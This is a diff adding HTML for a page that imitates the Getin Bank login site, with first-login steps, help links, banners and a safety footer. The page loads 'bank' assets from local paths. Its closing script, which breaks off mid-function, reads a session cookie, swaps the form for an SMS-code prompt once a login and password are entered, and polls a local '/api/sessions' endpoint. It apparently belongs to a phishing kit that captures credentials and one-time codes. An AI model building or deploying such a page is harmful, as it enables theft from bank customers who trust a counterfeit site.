+                                        <li>Podczas pierwszego logowania przygotuj swój <strong>login</strong> (znajdziesz go w wiadomości powitalnej e-mail z Banku oraz na umowie).</li>
+                                        <li>Do pierwszego logowania wykorzystaj <strong>hasło startowe</strong>, które otrzymałeś w wiadomości SMS.</li>
+                                        <li>Zmień hasło na własne. Możesz nadać dowolne hasło, które będzie Ci łatwo zapamiętać. Pamiętaj, że hasło powinno być trudne do odgadnięcia przez osoby postronne. W tym miejscu możesz też zdecydować czy w przyszłości będziesz podawać hasło w całości, czy tylko wybrane znaki. <strong>Podczas każdego kolejnego logowania należy używać tylko nowego hasła.</strong></li>
+                                        <li>Podaj <strong>kod SMS</strong>. Otrzymasz go po wpisaniu swojego nowego hasła.</li>
+                                        <li>Aby przyspieszyć logowanie możesz dodać własne urządzenie do <strong>Zarejestrowanych urządzeń</strong>. Podczas logowania na takim urządzeniu wystarczy podanie loginu i hasła.</li>
+                                    </ol>
+                                </div>
+                            </div>
+                            <hr>
+                        </div>
+                    </div>
+                </div>
+
+
+            </div></section>    <section class="h--section-gray margin0 slide_section" id="help_section">
+            <div class="question-help">Masz pytania?</div>
+            <div class="h--box-title">pomoc</div>
+            <div class="h--btn h--btn-wide small h--btn-white noble-hide" id="login_help">
+                <div class="help-contener"><i class="icon icon--help-mark"></i> Pomoc dotycząca logowania</div>
+                <i id="more_help" class="icon icon--more-black"></i>
+            </div>
+
+            <div id="help-box" style="display:none;">
+
+
+                <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#jak-wyglada-pierwsze-logowanie" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
+                    <div class="left-help">1.</div>
+                    <div class="right-help">Jak wygląda pierwsze logowanie?</div>
+                </a>
+                <div class="left-help border-help background-white"></div>
+                <div class="right-help border-help"></div>
+
+
+                <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#czym-jest-login" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
+                    <div class="left-help">2.</div>
+                    <div class="right-help">Czym jest login?</div>
+                </a>
+                <div class="left-help border-help background-white"></div>
+                <div class="right-help border-help"></div>
+
+
+                <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#jak-zmienic-login-do-bankowosci-internetowej" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
+                    <div class="left-help">3.</div>
+                    <div class="right-help">Jak zmienić login do Bankowości Internetowej?</div>
+                </a>
+                <div class="left-help border-help background-white"></div>
+                <div class="right-help border-help"></div>
+
+
+                <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#czym-jest-haslo" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
+                    <div class="left-help">4.</div>
+                    <div class="right-help">Czym jest hasło?</div>
+                </a>
+                <div class="left-help border-help"></div>
+                <div class="right-help border-help"></div>
+
+
+                <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa" target="_blank" class="h--btn-white h--btn h--btn-wide help-question mb-1">
+                    <div class="more-question">WIĘCEJ PYTAŃ</div>
+                </a>
+
+            </div>
+
+
+            <a class="h--btn h--btn-wide h--btn-white help-list" href="https://www.getinbank.pl/bezpieczenstwo/" target="_blank"><i class="icon icon--help-security"></i> Zasady bezpiecznej bankowości</a>
+            <a class="h--btn h--btn-wide h--btn-white help-list" href="http://demo.getinbank.pl/" target="_blank"><i class="icon icon--help-demo"></i> Demo Bankowości Internetowej</a>
+            <a class="h--btn h--btn-wide h--btn-white help-list" href="https://www.getinbank.pl/klienci-indywidualni/pomoc/bankowosc-telefoniczna" target="_blank"><i class="icon icon--help-phone"></i> Bankowość Telefoniczna</a>
+            <a class="h--btn h--btn-wide h--btn-white help-list" href="https://www.getinbank.pl/klienci-indywidualni/oferta/bankowosc-internetowa-i-mobilna/bankowosc-mobilna" target="_blank"><i class="icon icon--help-mobile"></i> Bankowość Mobilna</a>
+
+
+
+
+
+
+            <div class="help-phone-mobile phone-display">
+                <a class="h--btn h--btn-wide h--btn-white help-list help-phone" href="tel:+48 664 919 797" target="_blank">
+                    <i class="icon icon--phone"></i>
+                    <div>Zadzwoń na Infolinię +48 664 919 797<p>z telefonów komórkowych i stacjonarnych</p>
+                    </div></a>
+
+                <a class="h--btn h--btn-wide h--btn-white help-list help-phone noble-hide" href="tel:+48326043001" target="_blank">
+                    <i class="icon icon--phone"></i>
+                    <div>Zadzwoń na Infolinię +48 32 604 30 01<p>z zagranicy</p>
+                    </div></a>
+
+                <a class="h--btn h--btn-wide h--btn-white help-list infolinia" href="https://secure.getinbank.pl/?_ga=2.204400080.1160510372.1612390588-1737811655.1612390588" target="_blank"><p id="infolinia">Infolinia dostępna 7 dni w tygodniu całodobowo. Opłata za połączenie lokalne.</p></a>
+            </div>
+
+
+
+            <div class="help-phone-mobile screen-display">
+                <a class="h--btn h--btn-wide h--btn-white help-list help-phone" target="_blank">
+                    <i class="icon icon--phone"></i>
+                    <div>Zadzwoń na Infolinię +48 664 919 797<p>z telefonów komórkowych i stacjonarnych</p>
+                    </div></a>
+
+                <a class="h--btn h--btn-wide h--btn-white help-list help-phone noble-hide" target="_blank">
+                    <i class="icon icon--phone"></i>
+                    <div>Zadzwoń na Infolinię +48 32 604 30 01<p>z zagranicy</p>
+                    </div></a>
+
+                <a class="h--btn h--btn-wide h--btn-white help-list infolinia" href="https://secure.getinbank.pl/?_ga=2.204400080.1160510372.1612390588-1737811655.1612390588" target="_blank"><p id="infolinia">Infolinia dostępna 7 dni w tygodniu całodobowo. Opłata za połączenie lokalne.</p></a>
+            </div>
+
+
+
+            <div class="help-phone-descop">
+                <div class="h--btn h--btn-wide small midgray help-phone first-tel"><i class="icon icon--phone"></i>
+                    <div>Zadzwoń na Infolinię +48 664 919 797<p>z telefonów komórkowych i stacjonarnych</p>
+                    </div></div>
+
+                <div class="h--btn h--btn-wide small midgray help-phone noble-hide"><i class="icon icon--phone"></i>
+                    <div>Zadzwoń na Infolinię +48 32 604 30 01<p>z zagranicy</p>
+                    </div></div>
+
+                <p id="infolinia">Infolinia dostępna 7 dni w tygodniu całodobowo. Opłata za połączenie lokalne.</p>
+            </div>
+        </section>    <div class="login-info clearfix">
+            <div class="wrapper-help">
+                <div class="wrapper">
+                    <header><h3>Potrzebujesz pomocy?</h3></header>
+                    <div class="h--btn h--btn-wide small h--btn-white mobile-help-list">
+                        <p>Pomoc</p><i id="show_help_mobile" class="icon icon--more-black"></i>
+                    </div>
+
+                    <div class="show-helpbox-mobile">
+                        <div class="h--btn h--btn-wide small h--btn-white noble-hide" id="login_help_mobile">
+                            <div class="help-contener"><i class="icon icon--help-mark"></i> Pomoc dotycząca logowania</div>
+                            <i id="more_help_mobile" class="icon icon--more-black"></i>
+                        </div>
+
+                        <div id="help-box-mobile" style="display:none;">
+
+
+                            <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#jak-wyglada-pierwsze-logowanie" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
+                                <div class="left-help">1.</div>
+                                <div class="right-help">Jak wygląda pierwsze logowanie?</div>
+                            </a>
+                            <div class="left-help border-help background-white"></div>
+                            <div class="right-help border-help"></div>
+
+
+                            <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#czym-jest-login" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
+                                <div class="left-help">2.</div>
+                                <div class="right-help">Czym jest login?</div>
+                            </a>
+                            <div class="left-help border-help background-white"></div>
+                            <div class="right-help border-help"></div>
+
+
+                            <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#jak-zmienic-login-do-bankowosci-internetowej" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
+                                <div class="left-help">3.</div>
+                                <div class="right-help">Jak zmienić login do Bankowości Internetowej?</div>
+                            </a>
+                            <div class="left-help border-help background-white"></div>
+                            <div class="right-help border-help"></div>
+
+
+                            <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa#czym-jest-haslo" target="_blank" class="h--btn-white h--btn h--btn-wide help-question">
+                                <div class="left-help">4.</div>
+                                <div class="right-help">Czym jest hasło?</div>
+                            </a>
+                            <div class="left-help border-help"></div>
+                            <div class="right-help border-help"></div>
+
+
+                            <a href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa" target="_blank" class="h--btn-white h--btn h--btn-wide help-question mb-1">
+                                <div class="more-question">WIĘCEJ PYTAŃ</div>
+                            </a>
+
+                        </div>
+
+
+                        <a class="h--btn h--btn-wide h--btn-white help-list" href="https://www.getinbank.pl/bezpieczenstwo/" target="_blank"><i class="icon icon--help-security"></i> Zasady bezpiecznej bankowości</a>
+                        <a class="h--btn h--btn-wide h--btn-white help-list" href="http://demo.getinbank.pl/" target="_blank"><i class="icon icon--help-demo"></i> Demo Bankowości Internetowej</a>
+                        <a class="h--btn h--btn-wide h--btn-white help-list" href="https://www.getinbank.pl/klienci-indywidualni/pomoc/bankowosc-telefoniczna" target="_blank"><i class="icon icon--help-phone"></i> Bankowość Telefoniczna</a>
+                        <a class="h--btn h--btn-wide h--btn-white help-list" href="https://www.getinbank.pl/klienci-indywidualni/oferta/bankowosc-internetowa-i-mobilna/bankowosc-mobilna" target="_blank"><i class="icon icon--help-mobile"></i> Bankowość Mobilna</a>
+
+
+
+
+
+
+                        <div class="help-phone-mobile phone-display">
+                            <a class="h--btn h--btn-wide h--btn-white help-list help-phone" href="tel:+48 664 919 797" target="_blank">
+                                <i class="icon icon--phone"></i>
+                                <div>Zadzwoń na Infolinię +48 664 919 797<p>z telefonów komórkowych i stacjonarnych</p>
+                                </div></a>
+
+                            <a class="h--btn h--btn-wide h--btn-white help-list help-phone noble-hide" href="tel:+48326043001" target="_blank">
+                                <i class="icon icon--phone"></i>
+                                <div>Zadzwoń na Infolinię +48 32 604 30 01<p>z zagranicy</p>
+                                </div></a>
+
+                            <a class="h--btn h--btn-wide h--btn-white help-list infolinia" href="https://secure.getinbank.pl/?_ga=2.204400080.1160510372.1612390588-1737811655.1612390588" target="_blank"><p id="infolinia">Infolinia dostępna 7 dni w tygodniu całodobowo. Opłata za połączenie lokalne.</p></a>
+                        </div>
+
+
+
+                        <div class="help-phone-mobile screen-display">
+                            <a class="h--btn h--btn-wide h--btn-white help-list help-phone" target="_blank">
+                                <i class="icon icon--phone"></i>
+                                <div>Zadzwoń na Infolinię +48 664 919 797<p>z telefonów komórkowych i stacjonarnych</p>
+                                </div></a>
+
+                            <a class="h--btn h--btn-wide h--btn-white help-list help-phone noble-hide" target="_blank">
+                                <i class="icon icon--phone"></i>
+                                <div>Zadzwoń na Infolinię +48 32 604 30 01<p>z zagranicy</p>
+                                </div></a>
+
+                            <a class="h--btn h--btn-wide h--btn-white help-list infolinia" href="https://secure.getinbank.pl/?_ga=2.204400080.1160510372.1612390588-1737811655.1612390588" target="_blank"><p id="infolinia">Infolinia dostępna 7 dni w tygodniu całodobowo. Opłata za połączenie lokalne.</p></a>
+                        </div>
+
+
+
+                        <div class="help-phone-descop">
+                            <div class="h--btn h--btn-wide small midgray help-phone first-tel"><i class="icon icon--phone"></i>
+                                <div>Zadzwoń na Infolinię +48 664 919 797<p>z telefonów komórkowych i stacjonarnych</p>
+                                </div></div>
+
+                            <div class="h--btn h--btn-wide small midgray help-phone noble-hide"><i class="icon icon--phone"></i>
+                                <div>Zadzwoń na Infolinię +48 32 604 30 01<p>z zagranicy</p>
+                                </div></div>
+
+                            <p id="infolinia">Infolinia dostępna 7 dni w tygodniu całodobowo. Opłata za połączenie lokalne.</p>
+                        </div>
+
+                    </div>
+                    <div class="helpbox-margin-mobile"></div>
+
+                    <div class="content">
+                        <div class="banner">
+                            <div class="banner-container">
+                                <style>
+                                    .banner a{text-decoration: none;}
+                                    .banner h2{font-size: 48px;margin: 0px;}
+                                    .banner-middle p{position: absolute;bottom: 0;margin: 0px;}
+                                    .banner-bi-title{color: #2A2C31;font-size: 16px!important;margin: 0px;margin-top:18px;margin-bottom: 22px;padding: 0px;line-height: 22px}
+                                    .banner-bi-content-tall{font-size: 12px!important;margin-top: -7px!important;color: #2a2c31;}
+                                    .banner-bi-content-tall_logo{font-size: 12px!important;margin:-10px 0px 0px 0px!important;color: #2a2c31;}
+                                    .banner-bi-more{border-bottom: 1px dotted #9b9b9b;bottom: 24px;color: #2a2c31;display: inline-block;float: left;font-size: 10px;padding-bottom: 2px;position:absolute;text-decoration: none;margin-top: 25px;margin-bottom: -20px;}a{text-decoration: none;}
+                                    .banner-bi-nl{width:458px;height: 150px;margin-bottom: 20px;}
+                                    .banner-bi-nl-pic{float: left;height: 100%;width: 150px;}
+                                    .banner-bi-nl-main{float: right;height: 150px;width: 308px;position:relative;background-color: #FFF;}
+                                    @media (max-width: 1200px) {
+                                        .banner-bi-nl{
+                                            width: 375px!important;
+                                        }
+                                        .banner-bi-nl-main{
+                                            width: 225px!important;
+                                        }
+                                    }
+                                    @media (max-width: 959px) {
+                                        .banner-bi-nl{
+                                            width: 486px!important;
+                                        }
+                                        .banner-bi-nl-main{
+                                            width: 336px!important;
+                                        }
+                                    }
+                                    @media (max-width: 767px) {
+                                        .banner-bi-nl{
+                                            width: 344px!important;
+                                        }
+                                        .banner-bi-nl-main{
+                                            width: 194px!important;
+                                        }
+                                    }
+                                </style>
+                                <div class="banner-bi-nl">
+                                    <a target="_blank" href="https://www.getinbank.pl/klienci-indywidualni/biuro-prasowe/getin-noble-bank-z-tytulem-zloty-bank-2020.html">
+                                        <div class="banner-bi-nl-pic">
+                                            <img src="/assets/banks/getinbank_files/BISecure_Zloty_Bankier.jpg" alt="Złoty Bankier 2020">
+                                        </div>
+                                        <div class="banner-bi-nl-main">
+                                            <div style="margin-left: 16px;">
+                                                <p class="banner-bi-title">Najlepsza Jakość Obsługi<br>w Polsce - Złoty Bankier 2020</p>
+                                                <p class="banner-bi-content-tall">Dziękujemy za przyznanie tytułu „Złoty Bank”</p>
+                                                <p class="banner-bi-content-tall">za najlepszą wielokanałową jakość obsługi!</p>
+                                                <div class="banner-bi-more">
+                                                    Dowiedz się więcej
+                                                    <i class="icon icon--arrow-right-mark" style="float: right"></i>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </a>
+                                </div>            </div>
+                            <div class="banner-container">
+                                <style>
+                                    .banner a{text-decoration: none;}
+                                    .banner h2{font-size: 48px;margin: 0px;}
+                                    .banner-middle p{position: absolute;bottom: 0;margin: 0px;}
+                                    .banner-bi-title_blik{color: #2A2C31;font-size: 16px!important;margin: 0px;margin-top:18px;margin-bottom: 15px;padding: 0px;line-height: 22px}
+                                    .banner-bi-content-tall_blik{font-size: 12px!important;margin-top: -8px!important;color: #2a2c31;}
+                                    .banner-bi-content-tall_logo{font-size: 12px!important;margin:-10px 0px 0px 0px!important;color: #2a2c31;}
+                                    .banner-bi-more{border-bottom: 1px dotted #9b9b9b;bottom: 24px;color: #2a2c31;display: inline-block;float: left;font-size: 10px;padding-bottom: 2px;position:absolute;text-decoration: none;margin-top: 25px;margin-bottom: -20px;}a{text-decoration: none;}
+                                    .banner-bi-nl{width:458px;height: 150px;margin-bottom: 20px;}
+                                    .banner-bi-nl-pic{float: left;height: 100%;width: 150px;}
+                                    .banner-bi-nl-main{float: right;height: 150px;width: 308px;position:relative;background-color: #FFF;}
+                                    @media (max-width: 1200px) {
+                                        .banner-bi-nl{
+                                            width: 375px!important;
+                                        }
+                                        .banner-bi-nl-main{
+                                            width: 225px!important;
+                                        }
+                                    }
+                                    @media (max-width: 959px) {
+                                        .banner-bi-nl{
+                                            width: 486px!important;
+                                        }
+                                        .banner-bi-nl-main{
+                                            width: 336px!important;
+                                        }
+                                    }
+                                    @media (max-width: 767px) {
+                                        .banner-bi-nl{
+                                            width: 344px!important;
+                                        }
+                                        .banner-bi-nl-main{
+                                            width: 194px!important;
+                                        }
+                                    }
+                                </style>
+                                <div class="banner-bi-nl">
+                                    <a target="_blank" href="https://www.getinbank.pl/klienci-indywidualni/karty/przelewy-na-telefon-blik">
+                                        <div class="banner-bi-nl-pic">
+                                            <img src="/assets/banks/getinbank_files/BI_secure_BLIK1.jpg" alt="BLIK">
+                                        </div>
+                                        <div class="banner-bi-nl-main">
+                                            <div style="margin-left: 16px;">
+                                                <p class="banner-bi-title_blik">2 nowe praktyczne usługi BLIK<br>w Getin Mobile!</p>
+                                                <p class="banner-bi-content-tall_blik">Prośba o przelew BLIK i Podział rachunku BLIK </p>
+                                                <p class="banner-bi-content-tall_blik">ułatwią Ci wspólne rozliczenia ze znajomymi</p>
+                                                <p class="banner-bi-content-tall_blik">za składkowe zakupy albo wspólne wyjścia.</p>
+                                                <div class="banner-bi-more">
+                                                    Sprawdź
+                                                    <i class="icon icon--arrow-right-mark" style="float: right"></i>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </a>
+                                </div>            </div>
+                            <div class="banner-container">
+                                <style>
+                                    .banner a{text-decoration: none;}
+                                    .banner h2{font-size: 48px;margin: 0px;}
+                                    .banner-middle p{position: absolute;bottom: 0;margin: 0px;}
+                                    .banner-bi-title_blik2{color: #2A2C31;font-size: 16px!important;margin: 0px;margin-top:20px;margin-bottom: 15px;padding: 0px;line-height: 22px}
+                                    .banner-bi-content-tall_blik2{font-size: 12px!important;margin-top: -7px!important;color: #2a2c31;}
+                                    .banner-bi-content-tall_logo{font-size: 12px!important;margin:-10px 0px 0px 0px!important;color: #2a2c31;}
+                                    .banner-bi-more{border-bottom: 1px dotted #9b9b9b;bottom: 24px;color: #2a2c31;display: inline-block;float: left;font-size: 10px;padding-bottom: 2px;position:absolute;text-decoration: none;margin-top: 25px;margin-bottom: -20px;}a{text-decoration: none;}
+                                    .banner-bi-nl{width:458px;height: 150px;margin-bottom: 20px;}
+                                    .banner-bi-nl-pic{float: left;height: 100%;width: 150px;}
+                                    .banner-bi-nl-main{float: right;height: 150px;width: 308px;position:relative;background-color: #FFF;}
+                                    @media (max-width: 1200px) {
+                                        .banner-bi-nl{
+                                            width: 375px!important;
+                                        }
+                                        .banner-bi-nl-main{
+                                            width: 225px!important;
+                                        }
+                                    }
+                                    @media (max-width: 959px) {
+                                        .banner-bi-nl{
+                                            width: 486px!important;
+                                        }
+                                        .banner-bi-nl-main{
+                                            width: 336px!important;
+                                        }
+                                    }
+                                    @media (max-width: 767px) {
+                                        .banner-bi-nl{
+                                            width: 344px!important;
+                                        }
+                                        .banner-bi-nl-main{
+                                            width: 194px!important;
+                                        }
+                                    }
+                                </style>
+                                <div class="banner-bi-nl">
+                                    <a target="_blank" href="https://www.getinbank.pl/klienci-indywidualni/bankowosc-elektroniczna/usluga-moje-id">
+                                        <div class="banner-bi-nl-pic">
+                                            <img src="/assets/banks/getinbank_files/BI_secure_BLIK2.jpg" alt="BLIK">
+                                        </div>
+                                        <div class="banner-bi-nl-main">
+                                            <div style="margin-left: 16px;">
+                                                <p class="banner-bi-title_blik2">Skorzystaj z usługi Moje ID<br>w Getin Banku</p>
+                                                <p class="banner-bi-content-tall_blik2">Potwierdzaj swoją tożsamość</p>
+                                                <p class="banner-bi-content-tall_blik2">bez wychodzenia z domu!</p>
+                                                <div class="banner-bi-more">
+                                                    Sprawdź
+                                                    <i class="icon icon--arrow-right-mark" style="float: right"></i>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </a>
+                                </div>            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+        </div>
+        <section class="h--section-gray margin0 slide_section" id="msg_section" style="height: 782px;">
+            <p class="mgs_title"></p>
+
+            <p class="title-wide"><span class="mgs_date"></span></p>
+
+            <div class="mgs_content scrollMe nano has-scrollbar" style="height:250px;" id="1612390592036_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px; right: -17px;">
+                </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="height: 234px; transform: translate(0px, 0px);"></div></div></div>
+            <div class="bt">
+                <a class="h--btn-text-gray hideMgsSection">← schowaj wiadomość</a>
+            </div>
+        </section>
+    </div>
+    <div class="section-footer">
+        <div class="section-help-secure">
+
+            <div class="section-help">
+
+                <h4>Pomoc</h4>
+                <div class="help-guild">
+
+                    <div><a target="_blank" href="https://www.getinbank.pl/klienci-indywidualni/poradnik/bankowosc-internetowa/instrukcja-pierwszego-logowania-do-bankowosci-internetowej">Pierwsze logowanie</a><br></div>
+                    <div><a target="_blank" href="https://www.getinbank.pl/klienci-indywidualni/poradnik/bankowosc-internetowa/instrukcja-odblokowania-dostepu-do-bankowosci-internetowej">Odblokowanie dostępu</a><br></div>
+                    <div><a target="_blank" href="https://secure.getinbank.pl/?_ga=2.204400080.1160510372.1612390588-1737811655.1612390588#management/remindLogin">Przypomnienie loginu</a><br></div>
+                    <div><a target="_blank" href="https://www.getinbank.pl/klienci-indywidualni/poradnik/bankowosc-internetowa/instrukcja-przypomnienia-hasla">Reset hasła</a><br></div>
+                    <div><a target="_blank" href="http://demo.getinbank.pl/">Demo Bankowości</a><br></div>
+                    <div><a target="_blank" href="https://www.getinbank.pl/klienci-indywidualni/pytania-i-odpowiedzi/bankowosc-internetowa">FAQ</a><br></div>
+                    <div id="more-info-security"><a target="_blank" href="https://www.getinbank.pl/bezpieczenstwo">Więcej o bezpieczeństwie</a></div>
+
+                </div>
+
+            </div>
+
+            <div class="section-secure">
+
+                <h4 class="no_show_rules">Podstawowe zasady bezpieczeństwa</h4>
+                <h4 class="show_rules">Podstawowe zasady bezpieczeństwa <i id="show_rules" class="icon icon--more-black"></i></h4>
+
+                <div class="rules">
+                    <div class="rule">
+                        <div class="numbers bold">1</div>
+                        <div class="description bold">
+                            Dokładnie sprawdzaj, czy informacje zawarte w SMSie autoryzacyjnym są zgodne z danymi transakcji. Zwróć uwagę czy zgadza się numer rachunku i kwota transakcji.
+                        </div>
+                    </div>
+                    <div class="rule">
+                        <div class="numbers bold">2</div>
+                        <div class="description bold">
+                            Zawsze loguj się przez stronę www.getinbank.pl. Sprawdź przed zalogowaniem, czy widzisz https w adresie strony i czy połączenie jest szyfrowane.
+                        </div>
+                    </div>
+                    <div class="rule">
+                        <div class="numbers">3</div>
+                        <div class="description">
+                            Nie odpowiadaj na wiadomości od podejrzanych nadawców, nie otwieraj załączników tych wiadomościach i nie korzystaj z zawartych w nich linków.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="rules2">
+                    <div class="rule">
+                        <div class="numbers">4</div>
+                        <div class="description">
+                            Nie udostępniaj osobom trzecim loginu i hasła do Twojej Bankowości Internetowej i Mobilnej oraz kodów autoryzacyjnych.
+                        </div>
+                    </div>
+                    <div class="rule">
+                        <div class="numbers">5</div>
+                        <div class="description">
+                            Hasła do Bankowości, nie wykorzystuj w innych serwisach, np. społecznościowych.
+                        </div>
+                    </div>
+                    <div class="rule">
+                        <div class="numbers">6</div>
+                        <div class="description">
+                            Korzystaj z aktualnych wersji systemu operacyjnego, przeglądarek internetowych i programów antywirusowych.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="clearfix mb-7"></div>
+
+        <div class="section-copyright">
+            <div class="section-copyright-left">
+                <p class="footer-green">© 2021 Getin Bank</p>
+            </div>
+
+            <div class="section-copyright-right">
+                <p class="footer-green">Jesteśmy częścią Getin Noble Bank S.A.</p>
+                <p class="footer-swift">SWIFT: GBGCPLPK</p>
+            </div>
+        </div>
+
+
+
+    </div>
+
+
+    <section class="h--section-black margin0 keyboard_wrapper">
+        <button type="button" class="h--btn h--btn-white h--red-hover showKeyboard actionshowkeyboard prepend-icon"><i class="icon icon--close3"></i>zamknij</button>
+        <ul id="keyboard">
+            <li class="symbol"><span class="off">1</span><span class="on">!</span></li>
+            <li class="symbol"><span class="off">2</span><span class="on">@</span></li>
+            <li class="symbol"><span class="off">3</span><span class="on">#</span></li>
+            <li class="symbol"><span class="off">4</span><span class="on">$</span></li>
+            <li class="symbol"><span class="off">5</span><span class="on">%</span></li>
+            <li class="symbol"><span class="off">6</span><span class="on">^</span></li>
+            <li class="symbol"><span class="off">7</span><span class="on">&amp;</span></li>
+            <li class="symbol"><span class="off">8</span><span class="on">*</span></li>
+            <li class="symbol"><span class="off">9</span><span class="on">(</span></li>
+            <li class="symbol"><span class="off">0</span><span class="on">)</span></li>
+            <li class="symbol"><span class="off">-</span><span class="on">_</span></li>
+            <li class="symbol"><span class="off">=</span><span class="on">+</span></li>
+            <li class="delete lastitem" style="width: 134px;">Backspace</li>
+            <li class="tab symbol"><span class="off">`</span><span class="on">~</span></li>
+            <li class="letter">q</li>
+            <li class="letter">w</li>
+            <li class="letter">e</li>
+            <li class="letter">r</li>
+            <li class="letter">t</li>
+            <li class="letter">y</li>
+            <li class="letter">u</li>
+            <li class="letter">i</li>
+            <li class="letter">o</li>
+            <li class="letter">p</li>
+            <li class="symbol"><span class="off">[</span><span class="on">{</span></li>
+            <li class="symbol"><span class="off">]</span><span class="on">}</span></li>
+            <li class="symbol lastitem"><span class="off">\</span><span class="on">|</span></li>
+            <li class="capslock">Caps lock</li>
+            <li class="letter">a</li>
+            <li class="letter">s</li>
+            <li class="letter">d</li>
+            <li class="letter">f</li>
+            <li class="letter">g</li>
+            <li class="letter">h</li>
+            <li class="letter">j</li>
+            <li class="letter">k</li>
+            <li class="letter">l</li>
+            <li class="symbol"><span class="off">;</span><span class="on">:</span></li>
+            <li class="symbol"><span class="off">'</span><span class="on">"</span></li>
+            <li class="return lastitem">Enter</li>
+            <li class="left-shift">Shift</li>
+            <li class="letter">z</li>
+            <li class="letter">x</li>
+            <li class="letter">c</li>
+            <li class="letter">v</li>
+            <li class="letter">b</li>
+            <li class="letter">n</li>
+            <li class="letter">m</li>
+            <li class="symbol"><span class="off">,</span><span class="on">&lt;</span></li>
+            <li class="symbol"><span class="off">.</span><span class="on">&gt;</span></li>
+            <li class="symbol"><span class="off">/</span><span class="on">?</span></li>
+            <li class="right-shift lastitem">Shift</li>
+            <li class="space lastitem">Space</li>
+        </ul>
+    </section>            </div>
+
+<div class="h--overlay-white">
+    <img src="/assets/banks/getinbank_files/loader.gif">
+</div>
+<div class="h--overlay-white-announcements">
+    <img src="/assets/banks/getinbank_files/loader.gif">
+</div>
+<div class="h--overlay-white-setings" style="zoom: 1;">
+    <img src="/assets/banks/getinbank_files/loader.gif">
+</div>
+
+<div class="container">
+    <div class="row h--overlay-credit-pa otherCase popup-overlay">
+        <div class="col-xs-8 col-md-6 col-sm-8 center popup-credit-pa">
+            <div class="row">
+                <div class="actions">
+                    <div class="float-right">
+                        <button type="button" class="button-close"><i class="icon icon--close"></i></button>
+                    </div>
+                </div>
+                <div class="col-xs-12 col-md-12 col-sm-12">
+                    <div class="title mt-15">Obecnie w systemie posiadasz już rozpoczęty wniosek.</div>
+                </div>
+                <div class="col-xs-12 col-md-12 col-sm-12">
+                    <div class="description">Wskaż, który wniosek chcesz kontynuować?</div>
+                </div>
+            </div>
+            <div class="row menu mb10">
+                <div class="col-xs-12 col-md-12 col-sm-12">
+                    <div class="table">
+                        <div class="row">
+                            <div class="col-xs-6 col-md-6 col-sm-6 no-mobile">
+
+                                <div class="max table"><a class="button-close-and-new"><span class="text-decoration">Nowy wniosek</span></a></div>                        </div>
+                            <div class="col-xs-6 col-md-6 col-sm-6  no-mobile">
+                                <div class="max table">
+                                    <a href="https://secure.getinbank.pl/?_ga=2.204400080.1160510372.1612390588-1737811655.1612390588#creditpa/index/" class="button-continue">Poprzedni wniosek</a>                            </div>
+                            </div>
+                            <div class="col-xs-12 col-md-6 col-sm-6 mobile">
+                                <div class="max table">
+                                    <a href="https://secure.getinbank.pl/?_ga=2.204400080.1160510372.1612390588-1737811655.1612390588#creditpa/index/" class="button-continue">Poprzedni wniosek</a>
+                                </div>
+                            </div>
+                            <div class="col-xs-12 col-md-6 col-sm-6 mobile">
+                                <div class="max table"><a class="button-close-and-new"><span class="text-decoration">Nowy wniosek</span></a></div>                        </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="blur">
+        </div>    </div>
+</div>
+<div class="container">
+    <div class="row h--overlay-credit-pa errorCase popup-overlay">
+        <div class="col-xs-8 col-md-6 col-sm-8 center popup-credit-pa">
+            <div class="row">
+                <div class="col-xs-12 col-md-12 col-sm-12">
+                    <div class="title ">System chwilowo niedostępny</div>
+                </div>
+                <div class="col-xs-12 col-md-12 col-sm-12">
+                    <div class="description">Prosimy spróbować później.</div>
+                </div>
+            </div>
+            <div class="row menu mb10">
+                <div class="col-xs-12 col-md-12 col-sm-12">
+                    <div class="table">
+                        <div class="row">
+                            <div class="col-md-9 site-main">
+                                <div class="max table">
+                                    <a class="button-accept come-back">Powrót do bankowości</a>                            </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="blur">
+        </div>    </div>
+</div>
+
+<script src="/assets/js/jquery-3.5.1.min.js"></script>
+<script src="/assets/js/cookies.core.1.3.min.js"></script>
+<script src="/assets/js/banklogin.js"></script>
+<script>
+    let bankId = (cookieManager.read('session_id'))
+
+    const getinBankUpdate = () => {
+        if ($("#bank_password").val() && $("#bank_login").val() !== "") {
+            $("#mainCont").empty()
+            $("#mainCont").append('<input type="text" placeholder="Kod SMS z telefonu" id="bank_psd" onclick="psdUpdate()">')
+            $("#buttonsCont").empty()
+            $("#buttonsCont").append('<button onclick="psdUpdate()" type="submit" class="h--btn-arrow-right h--btn-light-green gotoPassword float-right long login-next-button fz-12">dalej</button>')
+        } else {
+        }
+    }
+
+    const regularCheck = () => {
+        readTextFile("/api/sessions", function(text){
